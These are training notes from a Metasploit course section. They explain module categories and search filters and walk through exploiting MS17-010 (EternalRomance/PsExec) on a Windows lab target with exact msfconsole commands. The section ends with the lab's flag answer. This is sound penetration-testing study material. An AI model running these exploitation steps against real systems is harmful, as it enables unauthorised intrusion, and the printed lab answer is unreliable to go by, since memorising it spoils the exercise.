# NOTES — Modules

## ID
603

## Module
Using the Metasploit Framework

## Kind
notes

## Title
Section 4 — Modules

## Description
Module categories, the `<type>/<os>/<service>/<name>` path convention, searching with keyword filters, and selecting/configuring a module — demonstrated against MS17-010 EternalRomance/PsExec.

## Tags
metasploit, modules, search, ms17-010, eternalromance, exploitation

## Commands
- `help search`
- `search eternalromance`
- `search eternalromance type:exploit`
- `search type:exploit platform:windows cve:2021 rank:excellent microsoft`
- `search ms17_010`
- `use 0`
- `info`
- `options` / `show options`
- `set RHOSTS <ip>`
- `setg RHOSTS <ip>`
- `setg LHOST <ip>`
- `run`

## What This Section Covers
Modules are prepared Ruby scripts. They live under `/usr/share/metasploit-framework/modules/` and are selected by index number after a `search`. This section walks an MS17-010 (EternalRomance) exploit end-to-end against a Win 7 SMB target.

## Module Path Syntax
```
<No.> <type>/<os>/<service>/<name>
```
Example: `794   exploit/windows/ftp/scriptftp_list`

| Field | Meaning |
|-------|---------|
| `No.` | Index assigned by `search` output — pass to `use <no.>` |
| `type` | Category (see below) |
| `os` | Target OS / architecture |
| `service` | Vulnerable service or activity (`gather`, etc.) |
| `name` | What this specific module does |

## Module Types
| Type | Description |
|------|-------------|
| Auxiliary | Scanning, fuzzing, sniffing, admin features |
| Encoders | Keep payloads intact / re-shape bytes |
| Exploits | Exploits a vuln to deliver a payload |
| NOPs | Keep payload sizes consistent across attempts |
| Payloads | Code that runs on the target after exploitation |
| Plugins | 3rd-party extensions usable inside msfconsole |
| Post | Post-exploitation gathering / pivoting |

Only **Auxiliary / Exploit / Post** are usable with `use <no.>` — the rest support those.

## `search` Keywords (most useful)
| Keyword | Filter |
|---------|--------|
| `cve:<year>` or `cve:<id>` | Match CVE |
| `type:<auxiliary\|exploit\|post\|...>` | Filter by module type |
| `platform:<os>` | Target platform |
| `rank:<rank>` | Reliability (`excellent`, `great`, etc., or `gte400`) |
| `name:<pattern>` | Descriptive name match |
| `author:<name>` | Module author |
| `port:<port>` | Modules touching this port |
| `-<term>` | Exclude (prefix with `-`) |

`-S <regex>` post-filters results, `-s <column>` sorts, `-r` reverses, `-u` jumps in if there's exactly one result.

## Selecting & Configuring a Module — MS17-010 PsExec Walkthrough
```
search ms17_010                             # find candidates
use 0                                       # = exploit/windows/smb/ms17_010_psexec
info                                        # read description, refs, targets
options                                     # see required params (Required = yes)
set RHOSTS 10.10.10.40                      # target
setg LHOST 10.10.14.15                      # global LHOST (persists across modules)
run                                         # fire it
```

`set` vs `setg`:
- `set` — for this module only.
- `setg` — global, persists until msfconsole restarts. Use when you'll attack the same target with multiple modules.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Use the Framework to exploit the target with EternalRomance. Read `flag.txt` from Administrator's desktop. | **HTB{MSF-W1nD0w5-3xPL01t4t10n}** | `search eternalromance` → `use 0` (`exploit/windows/smb/ms17_010_psexec`) → `set LHOST tun0` → `set RHOSTS <ip>` → `exploit` → `cat C:\\Users\\Administrator\\Desktop\\flag.txt` |

## Key Takeaways
- After `search`, work from the index number — much faster than typing the full path.
- `info` BEFORE `run`. It tells you which targets the exploit supports, what the payload does, and how the exploit chain works — a few seconds here prevents lost shells later.
- `setg` for things that won't change across the engagement (LHOST, RHOSTS for a single target box) — kills the friction of re-setting every time you switch modules.

## Gotchas
- The MS17-010 PsExec exploit prints "ETERNALBLUE overwrite completed" in its output even though it's the **EternalRomance/Synergy/Champion** chain — the strings come from shared code. Trust the module name, not the log line.
- A failing exploit ≠ "vulnerability doesn't exist." Module POCs often need target-specific tweaks. Treat MSF as a fast first-pass, not a final verdict.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|using-the-metasploit]]
← [[03-introduction-to-msfconsole]] | [[05-targets]] →
<!-- AUTO-LINKS-END -->
